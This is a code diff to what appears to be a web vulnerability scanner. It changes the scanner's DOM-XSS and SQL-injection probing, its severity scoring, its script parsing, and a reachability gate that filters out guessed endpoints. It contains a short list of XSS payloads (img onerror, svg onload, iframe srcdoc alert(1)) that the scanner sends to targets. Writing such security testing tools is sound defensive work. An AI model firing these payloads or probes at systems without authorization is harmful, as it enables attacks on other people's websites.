+        ("<iframe srcdoc=\"<script>alert(1)</script>\">", "iframe_srcdoc", "Iframe srcdoc script execution"),
         ("<img src=x onerror=alert(1)>", "img_onerror", "Image onerror event"),
         ("<svg onload=alert(1)>", "svg_onload", "SVG onload event"),
         ("'-alert(1)-'", "js_expression", "JavaScript expression injection"),
@@ -7044,10 +9403,36 @@ async def hash_route_dom_xss_test(
         if not params:
             continue
 
+        # §4 DOM-sink prioritization: when the per-endpoint param budget caps how
+        # many params we test, test the ones that most commonly flow into dangerous
+        # DOM sinks first (search/query/redirect/url/hash/...), plus any params the
+        # endpoint's JS analysis flagged as sink sources. Generic, app-agnostic.
+        sink_params = {str(s).lower() for s in (endpoint.get("dom_sink_params") or [])}
+        def _dom_sink_rank(p: str) -> int:
+            pl = str(p).lower()
+            if pl in sink_params:
+                return 0
+            if any(k in pl for k in (
+                "search", "query", "q", "redirect", "return", "url", "uri", "next",
+                "hash", "fragment", "html", "content", "msg", "message", "text",
+                "name", "title", "lang", "page", "view", "ref", "callback")):
+                return 1
+            return 2
+        params = sorted(params, key=_dom_sink_rank)
+
+        attempt = _new_endpoint_attempt(
+            endpoint,
+            "dom_xss",
+            url_override=endpoint_url,
+            method_override="GET",
+            params=list(params),
+        )
         results["endpoints_tested"] += 1
 
         for param in params[:max_params_per_endpoint]:
             results["params_tested"] += 1
+            if attempt is not None:
+                attempt["attempted_params_count"] += 1
 
             for payload, technique, description in DOM_XSS_PAYLOADS:
                 # Build test URL with payload in fragment parameter
@@ -7066,7 +9451,11 @@ async def hash_route_dom_xss_test(
                         fragment_params=test_frag_params,
                     )
                     if proof and proof.proven:
-                        severity = "high" if proof.confidence >= 0.9 else "medium"
+                        # A fired dialog / console execution (confidence >= 0.9) is
+                        # confirmed script execution -> High. Pass an explicit High CVSS
+                        # so the generic XSS base score (6.1) can't cap it to medium.
+                        executed = proof.confidence >= 0.9
+                        severity = "high" if executed else "medium"
                         finding = {
                             "type": "XSS",
                             "subtype": "dom_xss_hash_route",
@@ -7076,10 +9465,16 @@ async def hash_route_dom_xss_test(
                             "payload": payload,
                             "technique": technique,
                             "description": description,
-                            "evidence": [f"Browser proof: {proof.technique}", f"Confidence: {proof.confidence}"],
+                            "evidence": [
+                                f"Browser proof: {proof.technique}",
+                                f"Confidence: {proof.confidence}",
+                                "payload executed in headless browser (dialog fired)" if executed
+                                else "payload landed in executable DOM context",
+                            ],
                             "confidence": proof.confidence,
                             "severity": severity,
-                            "verified": True,
+                            "cvss_score": 7.4 if executed else 6.1,
+                            "verified": executed,
                         }
                         if hasattr(proof, "to_dict"):
                             finding["browser_proof"] = proof.to_dict()
@@ -7089,6 +9484,12 @@ async def hash_route_dom_xss_test(
                 except Exception:
                     # Browser proof failed, continue with other payloads
                     pass
+            if attempt is not None:
+                attempt["completed_params_count"] += 1
+
+        finished = _finish_endpoint_attempt(attempt)
+        if finished:
+            results["endpoint_attempts"].append(finished)
 
     return results
 
@@ -7208,28 +9609,12 @@ async def dom_xss_analysis(
         if rc != 0 or not out:
             return results
 
-        # Extract JavaScript URLs from the page
+        # Extract JavaScript URLs and inline scripts with a real HTML parser.
         js_urls = []
-        # Script src patterns
-        src_pattern = r'<script[^>]+src=["\']([^"\']+)["\']'
-        for match in re.finditer(src_pattern, out, re.I):
-            src = match.group(1)
+        script_sources, inline_scripts = _html_scripts(out)
+        for src in script_sources:
             if not src.startswith("data:"):
-                # Resolve relative URLs
-                if src.startswith("//"):
-                    src = "https:" + src
-                elif src.startswith("/"):
-                    parsed = urllib.parse.urlparse(url)
-                    src = f"{parsed.scheme}://{parsed.netloc}{src}"
-                elif not src.startswith("http"):
-                    parsed = urllib.parse.urlparse(url)
-                    base_path = "/".join(parsed.path.split("/")[:-1])
-                    src = f"{parsed.scheme}://{parsed.netloc}{base_path}/{src}"
-                js_urls.append(src)
-
-        # Also look for inline scripts
-        inline_pattern = r'<script[^>]*>([\s\S]*?)</script>'
-        inline_scripts = re.findall(inline_pattern, out, re.I)
+                js_urls.append(urllib.parse.urljoin(url, src))
 
         # Analyze inline scripts
         for i, script_content in enumerate(inline_scripts[:10]):  # Limit inline scripts
@@ -7374,6 +9759,224 @@ def _split_active_family_budget(active_max_seconds: float, run_sqli: bool, run_x
 USE_DEFAULT_MAX_FINDINGS_PER_FAMILY: Any = object()
 
 
+FALLBACK_ACTIVE_FAMILY_DISPATCH_ORDER = ("sqli", "xss")
+
+
+def _registry_active_family_dispatch_order() -> tuple[str, ...]:
+    if _check_registry is None or not hasattr(_check_registry, "default_parallel_focus_families"):
+        return FALLBACK_ACTIVE_FAMILY_DISPATCH_ORDER
+    try:
+        families = tuple(
+            str(spec.name)
+            for spec in _check_registry.default_parallel_focus_families()
+            if getattr(spec, "scanner_options", None)
+            and str(getattr(spec, "name", "")) in FALLBACK_ACTIVE_FAMILY_DISPATCH_ORDER
+        )
+    except Exception:
+        return FALLBACK_ACTIVE_FAMILY_DISPATCH_ORDER
+    return families or FALLBACK_ACTIVE_FAMILY_DISPATCH_ORDER
+
+
+def _enabled_active_family_names(*, run_sqli: bool, run_xss: bool) -> tuple[str, ...]:
+    enabled = {
+        "sqli": bool(run_sqli),
+        "xss": bool(run_xss),
+    }
+    return tuple(name for name in _registry_active_family_dispatch_order() if enabled.get(name))
+
+
+# Endpoint sources that were actually observed (crawl / spec / browser / HAR /
+# manual). These are never reachability-dropped. Everything else is a
+# synthesized/guessed path (blind wordlist + API-version permutations) which can
+# explode into phantom 404s that drown the active budget and hang the scan, so
+# those are probed first and dropped if they don't exist.
+_ACTIVE_OBSERVED_SOURCES = frozenset({
+    "har_discovery", "har", "har_network_capture", "browser", "browser_api",
+    "browser_api_endpoints", "crawl", "url_crawl", "openapi", "swagger",
+    "graphql", "manual", "manual_endpoints", "form", "hash_route",
+    "resource_id_propagation", "js_bundle_analysis", "katana",
+})
+
+
+def _is_synthetic_active_source(endpoint: dict[str, Any]) -> bool:
+    return str(endpoint.get("source") or "").strip().lower() not in _ACTIVE_OBSERVED_SOURCES
+
+
+def _reachability_eligible(endpoint: dict[str, Any]) -> bool:
+    """Whether a GET-based reachability probe can validly judge this endpoint.
+
+    The reachability gate probes each candidate with GET and drops it if the
+    response matches a sibling-404 decoy. That question is only meaningful for
+    GET routes with no body: a POST/PUT/PATCH route returns 404/405/5xx to GET
+    even when it exists (e.g. Juice Shop ``POST /rest/user/login`` exists but
+    ``GET /rest/user/login`` → 500, identical to a 500 sibling), so GET-probing
+    it wrongly classifies the route as a phantom and drops it before body
+    injection ever runs. Endpoints carrying ``body_params`` also have a concrete
+    injection surface and must not be dropped on a mismatched GET probe. The
+    GET-permutation explosion the gate exists to kill (``/api/v{n}/oauth2/
+    authorize`` etc.) is unaffected — those remain GET, no-body, and gated.
+    """
+    if not _is_synthetic_active_source(endpoint):
+        return False
+    if str(endpoint.get("method") or "GET").upper() != "GET":
+        return False
+    if endpoint.get("body_params"):
+        return False
+    return True
+
+
+def _response_matches_not_found(
+    status: int | None,
+    body_len: int,
+    decoy_status: int | None,
+    decoy_len: int,
+) -> bool:
+    """Pure: does this look like a not-found page (a phantom we should not fuzz)?
+
+    Clear 404/410 always counts. Otherwise it counts only when the response
+    matches a *sibling* decoy (a random path under the SAME parent): same status
+    and near-identical body length means the parent serves every child the same
+    way, i.e. the route does not exist. Only ever applied to synthetic-source
+    endpoints, so matching 401/403/5xx to a decoy is safe (a real observed route
+    is never gated). ``status is None`` (transient error) is kept.
+    """
+    if status is None:
+        return False
+    if status in (404, 410):
+        return True
+    if (
+        decoy_status is not None
+        and status == decoy_status
+        and decoy_len >= 0
+        and abs(body_len - decoy_len) <= max(48, int(decoy_len * 0.07))
+    ):
+        return True
+    return False
+
+
+async def _filter_reachable_active_endpoints(
+    base_url: str,
+    endpoints: list[dict],
+    auth_session: Any | None = None,
+    *,
+    max_probe: int = 1500,
+    max_parents: int = 250,
+    concurrency: int = 24,
+    timeout: float = 4.0,
+) -> list[dict]:
+    """Drop *synthesized* endpoints that don't exist so the active budget reaches
+    real routes instead of hanging on guessed permutations (e.g. the blind
+    ``/api/v{n}/oauth2/authorize`` / ``/rest/v{n}/auth/register`` explosion).
+
+    Uses a *per-parent sibling decoy*: for each candidate path, a random leaf under
+    the same parent is probed; if the candidate responds the same as that decoy
+    (same status + near-identical body length), the parent serves all children
+    identically, so the route doesn't exist. This catches ``/rest`` and ``/api``
+    404/SPA signatures a single root decoy would miss. Observed endpoints are never
+    probed or dropped. Best-effort: on any error, returns ``endpoints`` unchanged.
+    """
+    synthetic = [e for e in endpoints if isinstance(e, dict) and _reachability_eligible(e)]
+    if len(synthetic) < 5:
+        return endpoints
+    try:
+        import aiohttp
+    except Exception:
+        return endpoints
+
+    headers, cookies = {}, {}
+    try:
+        if auth_session and getattr(auth_session, "config", None):
+            headers = dict(getattr(auth_session.config, "headers", {}) or {})
+            cookies = dict(getattr(auth_session.config, "cookies", {}) or {})
+    except Exception:
+        headers, cookies = {}, {}
+
+    def _abs(raw: Any) -> str:
+        u = str(raw or "")
+        return u if u.startswith("http") else urllib.parse.urljoin(base_url, u if u.startswith("/") else "/" + u)
+
+    def _parent(path: str) -> str:
+        segs = [s for s in path.split("/") if s]
+        return "/" + "/".join(segs[:-1]) if segs else "/"
+
+    cand_paths: list[str] = []
+    seen: set[str] = set()
+    for ep in synthetic:
+        path = urllib.parse.urlparse(_abs(ep.get("url") or ep.get("path"))).path or "/"
+        if path not in seen:
+            seen.add(path)
+            cand_paths.append(path)
+    cand_paths = cand_paths[:max_probe]
+
+    parents: list[str] = []
+    pseen: set[str] = set()
+    for path in cand_paths:
+        par = _parent(path)
+        if par not in pseen:
+            pseen.add(par)
+            parents.append(par)
+    parents = parents[:max_parents]
+    _DECOY_LEAF = "shakerscan-not-real-zzqx7"
+
+    sem = asyncio.Semaphore(concurrency)
+
+    async def _probe(session, full_url):
+        async with sem:
+            try:
+                async with session.get(
+                    full_url, timeout=aiohttp.ClientTimeout(total=timeout),
+                    allow_redirects=True, ssl=False,
+                ) as resp:
+                    return resp.status, len(await resp.text())
+            except Exception:
+                return None, -1
+
+    try:
+        async with aiohttp.ClientSession(headers=headers, cookies=cookies) as session:
+            decoy_targets = [(par, _abs(par.rstrip("/") + "/" + _DECOY_LEAF)) for par in parents]
+            decoy_results = await asyncio.gather(*[_probe(session, u) for (_par, u) in decoy_targets])
+            decoy_by_parent = {par: res for (par, _u), res in zip(decoy_targets, decoy_results)}
+            # ALWAYS probe each candidate, then compare it to its parent's sibling
+            # decoy. A parent's random sibling returning 404 does NOT imply the
+            # parent is empty — a real route (/rest/products/search) can coexist
+            # with /rest/products/<random> -> 404. Inferring "parent 404 => all
+            # children gone" without probing would drop real routes and make a
+            # vulnerable app look clean, so no such fast-path is used.
+            to_probe = cand_paths[:max_probe]
+            cand_results = await asyncio.gather(*[_probe(session, _abs(p)) for p in to_probe])
+    except Exception:
+        return endpoints
+
+    unreachable: set[str] = set()
+    for path, (status, blen) in zip(to_probe, cand_results):
+        d_status, d_len = decoy_by_parent.get(_parent(path), (None, -1))
+        if _response_matches_not_found(status, blen, d_status, d_len):
+            unreachable.add(path)
+    if not unreachable:
+        return endpoints
+
+    kept, dropped = [], 0
+    for ep in endpoints:
+        # Gate the drop by the SAME eligibility used to build the probe set so a
+        # non-eligible endpoint (e.g. POST login) sharing a path with an eligible
+        # GET phantom is never collaterally dropped.
+        if isinstance(ep, dict) and _reachability_eligible(ep):
+            path = urllib.parse.urlparse(_abs(ep.get("url") or ep.get("path"))).path or "/"
+            if path in unreachable:
+                dropped += 1
+                continue
+        kept.append(ep)
+    if not kept:
+        return endpoints  # guard against a misfiring decoy
+    print(
+        f"[active] Reachability gate: dropped {dropped} phantom synthetic endpoint(s) "
+        f"({len(unreachable)} unreachable / {len(cand_paths)} probed across {len(parents)} parents); "
+        f"{len(kept)} remain",
+        file=sys.stderr,
+    )
+    return kept
+
+
 async def run_smart_active_tests(
     url: str,
     endpoints: list[dict],
@@ -7470,9 +10073,27 @@ async def run_smart_active_tests(
         sql_priority_params = ["id", "user", "uid", "account", "login", "query", "search", "filter"]
         prioritized_endpoints = sorted(
             endpoints,
-            key=lambda e: sum(1 for p in (e.get("params", []) + e.get("body_params", [])) if any(sp in p.lower() for sp in sql_priority_params)),
+            key=lambda e: sum(
+                1
+                for p in (
+                    _coerce_param_names(e.get("params"))
+                    + _coerce_param_names(e.get("query_params"))
+                    + _coerce_param_names(e.get("body_params"))
+                )
+                if any(sp in p.lower() for sp in sql_priority_params)
+            ),
             reverse=True
         )
+
+    # Drop synthesized phantom endpoints (404/soft-404) BEFORE fuzzing so the
+    # active budget reaches real routes instead of hanging on guessed permutations
+    # (e.g. blind /api/v{n}/oauth2/authorize). Observed routes are never dropped.
+    try:
+        prioritized_endpoints = await _filter_reachable_active_endpoints(
+            url, prioritized_endpoints, auth_session,
+        )
+    except Exception as _reach_err:
+        print(f"[active] reachability gate skipped: {_reach_err}", file=sys.stderr)
 
     # Run SQLi and XSS tests with signal awareness. Smart scans should remain
     # adaptive, but they still need an overall active probing budget so one
@@ -7497,61 +10118,62 @@ async def run_smart_active_tests(
             file=sys.stderr,
         )
 
-    if run_sqli:
-        _emit_scan_progress("active_sqli", 91, "starting SQLi probes")
-        sqli_remaining = min(_remaining_active_seconds(), sqli_active_max_seconds)
-        sqli_results = await smart_sqli_test(
-            url, prioritized_endpoints, dbms, auth_session,
-            max_endpoints=sqli_max_endpoints,
-            max_params_per_endpoint=sqli_max_params,
-            max_seconds=sqli_remaining,
-            max_findings=max_findings_per_family,
-        )
-    else:
-        sqli_results = {
-            "findings": [],
-            "dbms_detected": dbms,
-            "vulnerabilities_found": 0,
-            "get_endpoints_tested": 0,
-            "post_endpoints_tested": 0,
-            "endpoints_tested": 0,
-            "skipped": True,
-            "reason": "sql_tests_disabled",
-        }
+    sqli_results = {
+        "findings": [],
+        "dbms_detected": dbms,
+        "vulnerabilities_found": 0,
+        "get_endpoints_tested": 0,
+        "post_endpoints_tested": 0,
+        "endpoints_tested": 0,
+        "skipped": True,
+        "reason": "sql_tests_disabled",
+    }
+    xss_results = {
+        "findings": [],
+        "reflections_found": 0,
+        "vulnerabilities_found": 0,
+        "endpoints_tested": 0,
+        "skipped": True,
+        "reason": "xss_tests_disabled",
+    }
 
-    if run_xss:
-        remaining = _remaining_active_seconds()
-        if remaining <= 1.0:
-            print("[active] Skipping XSS probes: active probing time budget exhausted by SQLi", file=sys.stderr)
-            _emit_scan_progress("active_xss", 92, "skipping XSS probes; active time budget exhausted")
-            xss_results = {
-                "findings": [],
-                "reflections_found": 0,
-                "vulnerabilities_found": 0,
-                "endpoints_tested": 0,
-                "skipped": True,
-                "reason": "active_time_budget_exhausted",
-                "budget_exhausted": True,
-                "budget_exhausted_reason": "time_budget",
-            }
-        else:
-            _emit_scan_progress("active_xss", 92, "starting XSS probes")
-            xss_results = await smart_xss_test(
-                url, endpoints, auth_session=auth_session,
-                max_endpoints=xss_max_endpoints,
-                max_params_per_endpoint=xss_max_params,
-                max_seconds=remaining,
+    for family_name in _enabled_active_family_names(run_sqli=run_sqli, run_xss=run_xss):
+        if family_name == "sqli":
+            _emit_scan_progress("active_sqli", 91, "starting SQLi probes")
+            sqli_remaining = min(_remaining_active_seconds(), sqli_active_max_seconds)
+            sqli_results = await smart_sqli_test(
+                url, prioritized_endpoints, dbms, auth_session,
+                max_endpoints=sqli_max_endpoints,
+                max_params_per_endpoint=sqli_max_params,
+                max_seconds=sqli_remaining,
                 max_findings=max_findings_per_family,
             )
-    else:
-        xss_results = {
-            "findings": [],
-            "reflections_found": 0,
-            "vulnerabilities_found": 0,
-            "endpoints_tested": 0,
-            "skipped": True,
-            "reason": "xss_tests_disabled",
-        }
+            continue
+
+        if family_name == "xss":
+            remaining = _remaining_active_seconds()
+            if remaining <= 1.0:
+                print("[active] Skipping XSS probes: active probing time budget exhausted by SQLi", file=sys.stderr)
+                _emit_scan_progress("active_xss", 92, "skipping XSS probes; active time budget exhausted")
+                xss_results = {
+                    "findings": [],
+                    "reflections_found": 0,
+                    "vulnerabilities_found": 0,
+                    "endpoints_tested": 0,
+                    "skipped": True,
+                    "reason": "active_time_budget_exhausted",
+                    "budget_exhausted": True,
+                    "budget_exhausted_reason": "time_budget",
+                }
+            else:
+                _emit_scan_progress("active_xss", 92, "starting XSS probes")
+                xss_results = await smart_xss_test(
+                    url, prioritized_endpoints, auth_session=auth_session,
+                    max_endpoints=xss_max_endpoints,
+                    max_params_per_endpoint=xss_max_params,
+                    max_seconds=remaining,
+                    max_findings=max_findings_per_family,
+                )
 
     # Hash-route DOM XSS is part of XSS coverage. Keep it in default smart
     # scans, but honor focused SQLi-only scans.
@@ -7577,6 +10199,11 @@ async def run_smart_active_tests(
     xss_findings = xss_results.get("findings", [])
     hash_route_findings = hash_route_results.get("findings", [])
     all_findings = sqli_findings + xss_findings + hash_route_findings
+    endpoint_attempts = _merge_endpoint_attempt_telemetry(
+        sqli_results.get("endpoint_attempts"),
+        xss_results.get("endpoint_attempts"),
+        hash_route_results.get("endpoint_attempts"),
+    )
     active_elapsed_seconds = time.monotonic() - active_started
     active_remaining_seconds = _remaining_active_seconds()
     _emit_scan_progress("active", 94, "smart active tests complete")
@@ -7593,6 +10220,7 @@ async def run_smart_active_tests(
             "params_tested": sqli_results.get("params_tested", 0),
             "budget_exhausted": sqli_results.get("budget_exhausted", False),
             "budget_exhausted_reason": sqli_results.get("budget_exhausted_reason"),
+            "endpoint_attempts": sqli_results.get("endpoint_attempts", []),
         },
         "xss": {
             "findings": xss_findings + hash_route_findings,  # Include hash route DOM XSS in XSS results
@@ -7604,8 +10232,10 @@ async def run_smart_active_tests(
             "post_endpoints_tested": xss_results.get("post_endpoints_tested", 0),
             "budget_exhausted": xss_results.get("budget_exhausted", False),
             "budget_exhausted_reason": xss_results.get("budget_exhausted_reason"),
+            "endpoint_attempts": (xss_results.get("endpoint_attempts", []) or []) + (hash_route_results.get("endpoint_attempts", []) or []),
         },
         "hash_route_dom_xss": hash_route_results,  # Separate tracking for hash route DOM XSS
+        "endpoint_attempts": endpoint_attempts,
         "dbms_detected": sqli_results.get("dbms_detected"),
         "budget": {
             "active_max_seconds": active_max_seconds,
